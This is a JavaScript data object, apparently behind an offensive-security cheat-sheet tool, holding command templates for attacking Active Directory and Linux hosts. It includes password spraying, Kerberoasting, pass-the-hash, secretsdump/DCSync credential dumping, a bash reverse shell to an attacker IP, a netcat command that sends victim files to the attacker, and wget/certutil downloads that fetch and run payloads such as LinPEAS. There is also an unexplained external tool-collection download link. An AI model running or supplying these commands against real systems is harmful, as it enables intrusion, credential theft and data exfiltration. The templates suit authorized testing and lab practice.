const commandsData = {
        "Enumeration": [
            {
                category: "Name Resolution",
                commands: [
                    { title: "/etc/hosts", description: "Register a local DNS entry for the victim.", template: "echo '$VictimIP $Domain' | sudo tee -a /etc/hosts" },
                    { title: "/etc/resolv.conf", description: "Register the victim as the primary DNS server.", template: "echo 'nameserver $VictimIP' | sudo tee /etc/resolv.conf" },
                ]
            },
            {
                category: "Nmap",
                commands: [
                    { title: "Basic Scan", description: "A simple yet effective scan to find open ports and identify services.", template: "nmap -sCV -T4 $VictimIP" },
                    { title: "All Ports Scan", description: "Scans all 65,535 TCP ports. Can be slow, but is very thorough.", template: "nmap -p- -T4 -vv $VictimIP" },
                    { title: "UDP Scan", description: "Scans for common open UDP ports.", template: "nmap -sU --top-ports 50 $VictimIP" },
                    { title: "Aggressive Scan", description: "Enables OS detection, version detection, script scanning, and traceroute.", template: "nmap -A -T4 $VictimIP" },
                ]
            },
            {
                category: "SMB & NXC",
                commands: [
                    { title: "NXC - Enumerate SMB", description: "Basic SMB enumeration with NetExec (nxc).", template: "nxc smb $VictimIP" },
                    { title: "NXC - Null Session Shares", description: "List SMB shares accessible with a null session.", template: "nxc smb $VictimIP -u '' -p '' --shares" },
                    { title: "NXC - Authenticated Shares", description: "List SMB shares using provided credentials.", template: "nxc smb $VictimIP -u 'USERNAME' -p 'PASSWORD' --shares" },
                ]
            }
        ],
        "Initial Access": [
            {
                category: "Password Attacks",
                commands: [
                    { title: "NXC - Password Spray", description: "Spray a single password against a list of users.", template: "nxc smb $VictimIP -u users.txt -p 'PASSWORD' --continue-on-success" },
                    { title: "Kerberoasting", description: "Request service tickets for users with SPNs to crack offline.", template: "impacket-GetUserSPNs -request -dc-ip $VictimIP $Domain/ATTACKER_USER" },
                    { title: "AS-REP Roasting", description: "Request TGTs for users that don't require pre-authentication.", template: "impacket-GetNPUsers $Domain/ -usersfile users.txt -format hashcat -outputfile hashes.asreproast" },
                ]
            }
        ],
        "Post Exploit": [
             {
                category: "AD Domination",
                commands: [
                    { title: "NXC - Pass The Hash", description: "Execute a command using a user's NTLM hash.", template: "nxc smb $VictimIP -u USERNAME -H 'LM_HASH:NT_HASH' -x 'whoami'" },
                    { title: "Secrets Dump", description: "Dumps secrets from the remote machine, including LSA secrets and SAM database.", template: "impacket-secretsdump $Domain/USERNAME:PASSWORD@$VictimIP" },
                    { title: "DCSync", description: "Ask a Domain Controller to replicate user credential data.", template: "impacket-secretsdump -just-dc-user $Domain/USERNAME $Domain/USERNAME:PASSWORD@$VictimIP" },
                ]
            },
            {
                category: "BloodHound",
                commands: [
                    { title: "BloodHound Ingestor (Python)", description: "Run this on a compromised machine to collect AD data.", template: "bloodhound-python -u USERNAME -p 'PASSWORD' -ns $VictimIP -d $Domain -c all" },
                    { title: "BloodHound Ingestor (Credentials)", description: "Run from your attack box with known credentials.", template: "bloodhound-python -u USERNAME -p 'PASSWORD' -d $Domain -ns $VictimIP -c all" },
                    { title: "BloodHound Ingestor (PTH)", description: "Run using Pass-the-Hash.", template: "bloodhound-python -u USERNAME -hashes :NTHASH -d $Domain -ns $VictimIP -c all" },
                ]
            },
            {
                category: "Linux PrivEsc",
                commands: [
                    { title: "LinPEAS", description: "Run the LinPEAS script to automatically find privilege escalation vectors.", template: "wget http://$AttackerIP:8000/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh" },
                    { title: "Check Sudo", description: "Check what commands the current user can run as root.", template: "sudo -l" },
                    { title: "Find SUID Binaries", description: "Find files with the SUID bit set, which may be exploitable.", template: "find / -perm -u=s -type f 2>/dev/null" },
                    { title: "Find Capabilities", description: "Find binaries with special capabilities that can be abused.", template: "getcap -r / 2>/dev/null" },
                    { title: "List Cron Jobs", description: "Check for scheduled tasks that might be misconfigured.", template: "cat /etc/crontab; ls -la /etc/cron.*" },
                    { title: "pspy64", description: "Monitor processes to find cron jobs or other automated scripts.", template: "./pspy64 -pf -i 1000" },
                ]
            }
        ],
        "Useful Commands": [
            {
                category: "General Utilities",
                commands: [
                    { title: "My Tool Collection", description: "Just my own Tool Collection. Might update once in a while", template: "https://drive.usercontent.google.com/download?id=1T00NujmQEiW42V7LBa7Sfo7jwemeBztK&export=download&authuser=0" },
                    { title: "Reverse Shell Listener", description: "Sets up a listener to catch an incoming reverse shell.", template: "rlwrap nc -nlvp $Port" },
                    { title: "Bash Reverse Shell", description: "Execute on a Linux victim to send a shell back.", template: "bash -c 'bash -i >& /dev/tcp/$AttackerIP/$Port 0>&1'" },
                    { title: "Python HTTP Server", description: "A simple way to serve files from your current directory.", template: "python3 -m http.server 8000" },
                    { title: "Download File (Linux)", description: "Download a file from your attacker machine to the victim.", template: "wget http://$AttackerIP:8000/file" },
                    { title: "Download File (Windows CMD)", description: "Download a file to a Windows victim via cmd.", template: "certutil.exe -urlcache -f http://$AttackerIP:8000/file file.exe" },
                    { title: "Download File (Windows PS)", description: "Download a file to a Windows victim via PowerShell.", template: "iwr -uri http://$AttackerIP:8000/file -outfile file.exe" },
                    { title: "Upload from Victim (Attacker)", description: "Create a listener in Attacker Machine", template: "nc -l -p $port -q 1 > file.zip < /dev/null" },
                    { title: "Upload from Victim (Victim)", description: "Upload data from Victim Machine to Attacker Machine by using netcat.", template: "cat file.zip | netcat $AttackerIP $port" },
                    { title: "Search (Linux)", description: "Find a file in linux", template: "find ~ -name '*.txt'" },
                    { title: "Search (Windows CMD)", description: "Find a file in linux", template: "dir *.txt /s /b" },
                ]
            }
        ]
    };